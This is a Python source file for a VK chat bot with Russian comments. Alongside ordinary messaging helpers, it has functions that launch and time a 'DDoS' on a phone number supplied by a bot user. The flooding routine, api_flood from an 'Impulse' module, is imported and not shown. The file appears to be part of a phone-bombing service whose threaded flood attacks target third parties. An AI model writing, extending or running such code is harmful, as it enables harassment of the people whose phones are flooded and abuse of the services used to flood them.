import random, threading
from connect import Connect
from threading import Thread
from Impulse.impulse import api_flood, threads_ddos
from parse_configuration import get_value_by_key

class API:
    api = Connect.VK
    longpoll = Connect.LONGPOLL 
    
    @staticmethod
    def get_random_id():
        # Вычисляем random_id для предотвращения повторных отправок сообщения
        return random.getrandbits(31) * random.choice([-1, 1])

    @staticmethod
    def messages_send(user_id, message):
        # Отправляем сообщение
        API.api.method('messages.send', { 'user_id': user_id, 'random_id': API.get_random_id(), 'message': message })

    @staticmethod
    def messages_send_with_keyboard(user_id, message, keyboard):
        # Отправляем сообщение с переданной клавиатурой( кнопками )
        API.api.method('messages.send', { 'user_id': user_id, 'random_id': API.get_random_id(), 'message': message, 'keyboard': keyboard })

    @staticmethod
    def users_get_username(user_id):
        # Получаем информацию о пользователе
        response = API.api.method('users.get', { 'user_id': user_id })[0]
        # Возвращаем имя и фамилию
        return response["first_name"] + ' ' + response["last_name"]

    @staticmethod
    def groups_isMember(user_id):
        return API.api.method('groups.isMember', { 'group_id': API.longpoll.group_id, 'user_id': user_id })

    @staticmethod
    def call_ddos_number(user_id, number, time, threads):
        threads_ddos[user_id] = Thread(target = api_flood, args = (number, time, threads))
        threads_ddos[user_id].start()
        clear_thread = threading.Timer(time, API.end_ddos_attack, [user_id, number])
        clear_thread.start()

    @staticmethod
    def end_ddos_attack(user_id, number):
        del threads_ddos[user_id]
        API.messages_send(user_id, get_value_by_key('BOT_ANSWER', 'BOT_DDOS_ENDED').format(number))

    @staticmethod 
    def is_already_user_id_ddos(user_id):
        return user_id in threads_ddos